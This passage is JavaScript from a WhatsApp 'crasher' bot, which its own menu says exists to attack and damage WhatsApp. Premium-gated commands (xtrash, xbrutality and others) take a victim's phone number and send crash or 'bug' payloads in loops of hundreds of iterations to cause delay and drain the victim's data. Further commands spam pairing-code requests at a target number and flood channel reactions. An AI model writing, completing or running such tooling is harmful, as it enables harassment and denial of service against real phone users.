        m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
┃ 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : ${command}
┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 : Jeda 5 menit tod
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("Error editing message:", error);
    }
}, 3000);

          for (let i = 0; i < 888; i++) {
            await protocolbug8(target);
            await sleep(1500);
            await protocolbug8(target);
            await protocolbug8(target);
            await sleep(2000);
            await protocolbug8(target);
            await protocolbug8(target);
            await sleep(1500);
            await protocolbug8(target);
            await sleep(4000);
            console.log(chalk.red("Successfully sent protocolbug8"))
            
}
    }
  
break;
//======================
case "xtrash": {
    
if (!isOwner && !isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix+command} 𝙩𝙤 ${target}`);

setTimeout(async () => {
    try {
        m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
┃ 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : ${command}
┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 : Jeda 5 menit tod
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("Error editing message:", error);
    }
}, 3000);

          for (let i = 0; i < 100; i++) {
            await bulldozer(target);
            await sleep(1500);
            await bulldozer(target);
            console.log(chalk.red("Successfully sent kuras kuota"))
           
}
    }
  
break;
//======================
case "xtrashnew": {
    
if (!isOwner && !isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix+command} 𝙩𝙤 ${target}`);

setTimeout(async () => {
    try {
        m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
┃ 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : ${command}
┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 : Jeda 5 menit tod
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("Error editing message:", error);
    }
}, 3000);

          for (let i = 0; i < 10; i++) {
            await bulldozer1GB(target);
            await sleep(1500);
            await bulldozer1GB(target);
            console.log(chalk.red("Successfully sent kuras kuota new"))
           
}
    }
  
break;
//======================
case "xbrutality": {
    
if (!isOwner && !isPremium) return m.reply('Khusus Premium');
    
if (!text) return m.reply(`\`Example:\` : ${prefix+command} 628×××`);
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
m.reply(`𝙋𝙧𝙤𝙨𝙚𝙨 𝙨𝙚𝙣𝙩 ${prefix+command} 𝙩𝙤 ${target}`);

setTimeout(async () => {
    try {
        m.reply(`┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃╺╺╸〢𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 𝐒𝐄𝐍𝐓 𝐁𝐔𝐆 〢╺╸╺
┃ 𝐓𝐚𝐫𝐠𝐞𝐭: ${target}
┃ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝 : ${command}
┃ 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 : Jeda 5 menit tod
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
    } catch (error) {
        console.error("Error editing message:", error);
    }
}, 3000);

          for (let i = 0; i < 888; i++) {
            await albumdelay(target);
            await sleep(1500);
            await albumdelay(target);
            await albumdelay(target);
            await sleep(1500);
            await albumdelay(target);
            await sleep(3000);
            console.log(chalk.red("Successfully sent delay hard"))
           
}
    }
  
break;
//======================
case 'public': {
if (!isOwner) return m.reply(mess.owner) 
if (rikz.public === true) return m.reply("Dari tadi udh public njr🤓");
rikz.public = true
m.reply(mess.succes)
}
break
//======================
case 'self': {
if (!isOwner) return m.reply(mess.owner) 
if (rikz.public === false) return m.reply("Dari tadi udh self njr🤓");
rikz.public = false
m.reply(mess.succes)
}
break
//======================
case "menu": case "rex": {
await rikz.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
await rikz.sendMessage(m.chat, {react: {text: '🖕', key: m.key}})
await rikz.sendMessage(m.chat, {react: {text: '🦠', key: m.key}})
await rikz.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let rex = `
[ ! ] - Меня зовут Ватоник - бот X 
Crasher,который создан для 
атаки и повреждения WhatsApp, 
поэтому используйте этого 
бота правильно
━━━━━━━━━━━━━━━━━━━━━
⪩ *𝙸𝚗𝚏҉͞𝚘̴𝚛̕͜𝚖𝚊𝚝𝚒𝚘̴𝚗́ -̶ ̷͡𝙱𝚘𝚝*⪨
» Bot name: Vatonic - X Crasher 
» Version: 2.0 VVIP
» Developer: RexStier 
» Action : ẉ.ceo/RexStier 

⪩ *𝙸̴𝚗͝͠𝚟̢͜𝚒̀𝚜͟͞𝚒̢𝚋̧̛𝚕𝚎͜͜ ͟͡-̸͝ 𝙱𝚞̸͡𝚐* ⪨
⟠ .xdelaynew ➞ permanen delay
⟠ .xproto7 ➞ protocolbug7
⟠ .xproto8 ➞ protocolbug8
⟠ .xtrash ➞ bulldozer
⟠ .xtrashnew ➞ bulldozer1gb
⟠ .xbrutality ➞ delay hard

⪩ *𝚂͢𝚙̨̨𝚊̛͜͞𝚖 ̵̨̛-͜͟ ̸𝙼̸𝚎̷͡𝚗͢𝚞͘҉* ⪨
⟠ .spampairing
⟠ .spamreactch 

⪩ *𝙾𝚠𝚗𝚎̡͢𝚛̷ ̵͢- ̷̧𝙼𝚎𝚗̨͜𝚞̕͝* ⪨
⟠ .addowner
⟠ .delowner
⟠ .addprem
⟠ .delprem 
⟠ .public/self

⪩ *𝚃͟͠𝚚𝚝̀҉𝚚* ⪨
⟠ Allah SWT ⟠
⟠ RexStier ⟠
⟠ Gilzy1 ⟠
⟠ Dxyro ⟠
⟠ Penggunaan Script ⟠

> © RexStier`;
rikz.sendMessage(m.chat, {
video: { url: global.vidthumb},
gifPlayback: true,
caption: rex,
 contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender], 
            forwardedNewsletterMessageInfo: {
                newsletterJid: `120363417866318708@newsletter`,
                newsletterName: 'Vatonic vvip version'
            },
 externalAdReply: {
 title: global.botname,
 body: `Developed RexStier`,
 thumbnailUrl: global.imgthumb,
 sourceUrl: global.link,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }},{quoted: m});

}
break;
//======================
case 'addowner': case 'addown': {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx`);

    let number = text.replace(/[^0-9]/g, '');
    let checkNumber = await rikz.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return m.reply("Invalid number!");

    owner.push(number);
    fs.writeFileSync('./system/database/owner.json', JSON.stringify(owner));

    m.reply("Owner added successfully.");
}
break;
//======================
case 'delowner': case 'delown': {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx`);

    let number = text.replace(/[^0-9]/g, '');
    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/database/owner.json', JSON.stringify(owner));

    m.reply("Owner removed successfully.");
}
break;
//======================
case "addprem": {
if (!isOwner) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /addprem (nomor)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`Added Premium:\n• ${user} (30 days)`)}
break;
//======================
case "delprem": {
if (!isOwner) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /delprem (nomor)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `Removed Premium:\n• ${user}` : "❌ User tidak ditemukan")}
break;
//======================
//case reactch
  case "spamreactch": {

if (!isOwner && !isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await rikz.newsletterMetadata("invite", result)

await rikz.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break      
//case spam pair
//======================
case 'spampairing': {
  if (!isOwner && !isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`*Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//======================
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}